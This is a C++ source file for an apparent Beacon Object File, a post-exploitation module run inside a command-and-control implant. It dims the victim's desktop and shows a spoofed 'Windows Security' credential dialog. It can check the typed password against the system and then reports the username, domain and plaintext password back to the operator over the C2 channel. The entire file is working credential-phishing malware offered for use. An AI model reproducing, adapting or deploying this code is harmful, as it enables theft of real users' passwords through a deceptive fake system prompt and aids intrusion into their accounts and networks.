#include <beacon.h>
#include <objbase.h>
#include <shellapi.h>
#include <windows.h>

#include <exception>

#include "app.h"
#include "args.h"
#include "credentials.h"
#include "dimmer.h"
#include "policy.h"
#include "prompt.h"
#include "target.h"

namespace {

constexpr int kMaximumUiStringBytes = 1024;
constexpr int kMaximumUiStringChars = kMaximumUiStringBytes / sizeof(wchar_t);
constexpr int kMaximumRawArgumentBytes = 4096;

struct SettingsStorage {
    AppSettings value;
    wchar_t caption[kMaximumUiStringChars];
    wchar_t message[kMaximumUiStringChars];
};

void set_default_settings(AppSettings* settings) {
    *settings = {
        L"",
        L"",
        kDefaultTimeoutSeconds,
        kDefaultMaxAttempts,
        false,
        false,
        false,
    };
}

void apply_packed_settings(const PackedArguments& packed, AppSettings* settings) {
    if (packed.caption != nullptr) {
        settings->caption = reinterpret_cast<const wchar_t*>(packed.caption);
    }
    if (packed.message != nullptr) {
        settings->message = reinterpret_cast<const wchar_t*>(packed.message);
    }
    if (packed.int_count > 0) {
        settings->timeout_seconds = clamp_timeout_seconds(packed.ints[0]);
    }
    if (packed.int_count > 1) {
        settings->max_attempts = clamp_max_attempts(packed.ints[1]);
    }
    if (packed.int_count > 2) {
        settings->validate = normalize_bool(packed.ints[2]);
    }
    if (packed.int_count > 3) {
        settings->persistent = normalize_bool(packed.ints[3]);
    }
    if (packed.int_count > 4) {
        settings->force = normalize_bool(packed.ints[4]);
    }
}

bool parse_decimal(const wchar_t* value, int* result) {
    if (value == nullptr || result == nullptr || *value == L'\0') {
        return false;
    }
    bool negative = false;
    if (*value == L'-' || *value == L'+') {
        negative = *value == L'-';
        ++value;
    }
    if (*value == L'\0') {
        return false;
    }
    unsigned int number = 0;
    const unsigned int limit = negative ? 2147483648U : 2147483647U;
    while (*value != L'\0') {
        if (*value < L'0' || *value > L'9') {
            return false;
        }
        const unsigned int digit = static_cast<unsigned int>(*value - L'0');
        if (number > (limit - digit) / 10U) {
            return false;
        }
        number = number * 10U + digit;
        ++value;
    }
    if (negative) {
        *result = number == 2147483648U
            ? (-2147483647 - 1)
            : -static_cast<int>(number);
    } else {
        *result = static_cast<int>(number);
    }
    return true;
}

bool copy_wide_argument(
    const wchar_t* source,
    wchar_t* destination,
    unsigned int capacity) {
    if (source == nullptr || destination == nullptr || capacity == 0) {
        return false;
    }
    unsigned int index = 0;
    while (source[index] != L'\0') {
        if (index + 1 >= capacity) {
            destination[0] = L'\0';
            return false;
        }
        destination[index] = source[index];
        ++index;
    }
    destination[index] = L'\0';
    return true;
}

bool parse_raw_settings(
    const char* data,
    int len,
    SettingsStorage* storage) {
    int raw_bytes = 0;
    while (raw_bytes < len && raw_bytes <= kMaximumRawArgumentBytes &&
           data[raw_bytes] != '\0') {
        ++raw_bytes;
    }
    if (raw_bytes == 0) {
        return true;
    }
    if (raw_bytes > kMaximumRawArgumentBytes) {
        return false;
    }

    constexpr wchar_t prefix[] = L"fake-windows-popup ";
    constexpr int command_line_capacity = kMaximumRawArgumentBytes + 32;
    auto* command_line = static_cast<wchar_t*>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        command_line_capacity * sizeof(wchar_t)));
    if (command_line == nullptr) {
        return false;
    }
    int prefix_chars = 0;
    while (prefix[prefix_chars] != L'\0') {
        command_line[prefix_chars] = prefix[prefix_chars];
        ++prefix_chars;
    }
    const int converted = MultiByteToWideChar(
        CP_ACP,
        MB_ERR_INVALID_CHARS,
        data,
        raw_bytes,
        command_line + prefix_chars,
        command_line_capacity - prefix_chars - 1);
    if (converted <= 0) {
        HeapFree(GetProcessHeap(), 0, command_line);
        return false;
    }
    command_line[prefix_chars + converted] = L'\0';

    int argc = 0;
    wchar_t** argv = CommandLineToArgvW(command_line, &argc);
    HeapFree(GetProcessHeap(), 0, command_line);
    if (argv == nullptr) {
        return false;
    }
    const int supplied = argc - 1;
    const bool shorthand = supplied == 4 || supplied == 5;
    const bool full = supplied == 6 || supplied == 7;
    if (!shorthand && !full) {
        LocalFree(argv);
        return false;
    }

    int first_number = 1;
    if (full) {
        if (!copy_wide_argument(argv[1], storage->caption, kMaximumUiStringChars) ||
            !copy_wide_argument(argv[2], storage->message, kMaximumUiStringChars)) {
            LocalFree(argv);
            return false;
        }
        storage->value.caption = storage->caption;
        storage->value.message = storage->message;
        first_number = 3;
    }

    int values[5]{};
    const int number_count = supplied - (first_number - 1);
    for (int index = 0; index < number_count; ++index) {
        if (!parse_decimal(argv[first_number + index], &values[index])) {
            LocalFree(argv);
            return false;
        }
    }
    LocalFree(argv);

    storage->value.timeout_seconds = clamp_timeout_seconds(values[0]);
    storage->value.max_attempts = clamp_max_attempts(values[1]);
    storage->value.validate = normalize_bool(values[2]);
    storage->value.persistent = normalize_bool(values[3]);
    if (number_count == 5) {
        storage->value.force = normalize_bool(values[4]);
    }
    return true;
}

bool parse_settings(const char* data, int len, SettingsStorage* storage) {
    set_default_settings(&storage->value);
    if (data == nullptr || len <= 0) {
        return true;
    }
    PackedArguments packed{};
    if (parse_packed_arguments(data, len, &packed)) {
        apply_packed_settings(packed, &storage->value);
        return true;
    }
    return parse_raw_settings(data, len, storage);
}

bool append_wide(
    wchar_t* destination,
    unsigned int capacity,
    unsigned int* length,
    const wchar_t* source) {
    while (*source != L'\0') {
        if (*length + 1 >= capacity) {
            destination[0] = L'\0';
            return false;
        }
        destination[(*length)++] = *source++;
    }
    destination[*length] = L'\0';
    return true;
}

bool build_default_message(
    const TargetInfo& target,
    wchar_t* message,
    unsigned int capacity) {
    unsigned int length = 0;
    return append_wide(
               message,
               capacity,
               &length,
               L"Enter your credentials to connect to: ") &&
           append_wide(message, capacity, &length, target.prompt_target);
}

void print_identity(const Credentials& credentials) {
    if (credentials.domain[0] != L'\0') {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[+] Identity: %ls\\%ls\n",
            credentials.domain,
            credentials.username);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Identity: %ls\n", credentials.username);
    }
}

void print_credentials(const Credentials& credentials) {
    print_identity(credentials);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Password: %ls\n", credentials.password);
}

// A C2 without the async API can leave the BeaconGetStopJobEvent import
// unresolved (NULL). GCC assumes a function address is never NULL and drops a
// plain `BeaconGetStopJobEvent != nullptr` check, so read it through a volatile.
HANDLE get_stop_job_event() {
    decltype(&BeaconGetStopJobEvent) volatile fn = &BeaconGetStopJobEvent;
    return fn != nullptr ? fn() : nullptr;
}

// Same for BeaconWakeup, which also runs on the "no async API" exit path
void wakeup() {
    decltype(&BeaconWakeup) volatile fn = &BeaconWakeup;
    if (fn != nullptr) {
        fn();
    }
}

// The C2 runs an async BOF on a thread it created, which has not joined a COM
// apartment. CredUI expects an STA, so join one for the lifetime of go.
class ComApartment {
public:
    ComApartment() : result_(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED)) {}
    ~ComApartment() {
        // S_OK and S_FALSE each need a matching CoUninitialize.
        // RPC_E_CHANGED_MODE means the thread is already MTA and we joined nothing.
        if (result_ == S_OK || result_ == S_FALSE) {
            CoUninitialize();
        }
    }
    ComApartment(const ComApartment&) = delete;
    ComApartment& operator=(const ComApartment&) = delete;
    HRESULT result() const { return result_; }

private:
    HRESULT result_;
};

// Wake the implant on every exit path so the final status line is delivered
// right away instead of on the next sleep cycle
struct WakeOnExit {
    WakeOnExit() = default;
    WakeOnExit(const WakeOnExit&) = delete;
    WakeOnExit& operator=(const WakeOnExit&) = delete;
    ~WakeOnExit() { wakeup(); }
};

void run(const char* data, int len, HANDLE stop_event) {
    SettingsStorage storage{};
    if (!parse_settings(data, len, &storage)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Invalid arguments; expected packed ZZiiiii or raw: [caption message] timeout attempts validate persistent [force]\n");
        return;
    }
    const AppSettings& settings = storage.value;

    DWORD process_session = static_cast<DWORD>(-1);
    ProcessIdToSessionId(GetCurrentProcessId(), &process_session);
    const DWORD console_session = WTSGetActiveConsoleSessionId();

    TargetInfo target{};
    DWORD error_code = ERROR_SUCCESS;
    if (!resolve_target(&target, &error_code)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Unable to resolve prompt target (error=%u)\n",
            error_code);
        return;
    }

    wchar_t generated_message[512]{};
    const wchar_t* caption = settings.caption[0] == L'\0'
        ? L"Windows Security"
        : settings.caption;
    const wchar_t* message = settings.message;
    if (message[0] == L'\0') {
        if (!build_default_message(
                target,
                generated_message,
                static_cast<unsigned int>(sizeof(generated_message) / sizeof(generated_message[0])))) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Generated prompt message is too long\n");
            return;
        }
        message = generated_message;
    }

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[*] Starting async credential prompt for %ls (timeout=%u%s, attempts=%u, validation=%s, persistent=%s, force=%s, session=%u, console-session=%u)\n",
        target.prompt_target,
        settings.timeout_seconds,
        settings.timeout_seconds == kNoTimeout ? " (none, stop the job to end it)" : "s",
        settings.max_attempts,
        settings.validate ? "on" : "off",
        settings.persistent ? "on" : "off",
        settings.force ? "on" : "off",
        process_session,
        console_session);

    DimmerWindow dimmer;
    if (!dimmer.start(&error_code)) {
        if (error_code == ERROR_HOTKEY_ALREADY_REGISTERED) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[-] Emergency hotkey is already registered; another fake-windows-popup instance may still be running (error=%u)\n",
                error_code);
            return;
        }
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Unable to create desktop dimmer (error=%u)\n",
            error_code);
        return;
    }
    if (!dimmer.foreground_activated()) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[*] Foreground activation denied; dimmer demoted below topmost windows\n");
    }

    Credentials credentials;
    PromptResult result = PromptResult::error;
    {
        const ComApartment com;
        if (FAILED(com.result()) && com.result() != RPC_E_CHANGED_MODE) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] CoInitializeEx failed (hr=0x%08lx); trying the prompt anyway\n",
                static_cast<unsigned long>(com.result()));
        }
        result = run_prompt(
            dimmer.hwnd(),
            dimmer.cancel_event(),
            stop_event,
            caption,
            message,
            settings,
            target,
            &credentials,
            &error_code);
    }
    dimmer.stop();

    if (result == PromptResult::captured || result == PromptResult::validated) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            result == PromptResult::validated
                ? "[+] Credential validated\n"
                : "[+] Credential captured without validation\n");
        print_credentials(credentials);
        wakeup();
    } else if (result == PromptResult::stopped) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential prompt stopped by operator\n");
    } else if (result == PromptResult::cancelled) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential prompt cancelled\n");
    } else if (result == PromptResult::timed_out) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential prompt timed out\n");
    } else if (result == PromptResult::attempts_exhausted) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[-] Credential validation failed after %u attempt(s) (error=%u)\n",
            settings.max_attempts,
            error_code);
        if (credentials.username[0] != L'\0') {
            print_credentials(credentials);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Credential prompt failed (error=%u)\n", error_code);
    }

    secure_zero(generated_message, sizeof(generated_message));
}

}  // namespace

extern "C" __declspec(dllexport) void go(const char* data, int len) {
    BEACON_INIT;

    // Declared first so it runs last, after the final status line
    const WakeOnExit wake_on_exit;

    try {
        // The C2 owns this handle, do not close it
        HANDLE stop_event = get_stop_job_event();
        if (stop_event == nullptr) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] fake-windows-popup-async must run as an async BOF (no stop job event from the C2)\n");
            return;
        }
        run(data, len, stop_event);
    }
    catch (const std::exception& ex) {
        BeaconPrintf(CALLBACK_ERROR, "[!] fake-windows-popup-async: %s\n", ex.what());
    }
}

// Built with BOF_PE_DLL, so this emits nothing. It records the argument
// format for loader.exe and keeps the source buildable as an EXE.
BEACON_MAIN("ZZiiiii", go)
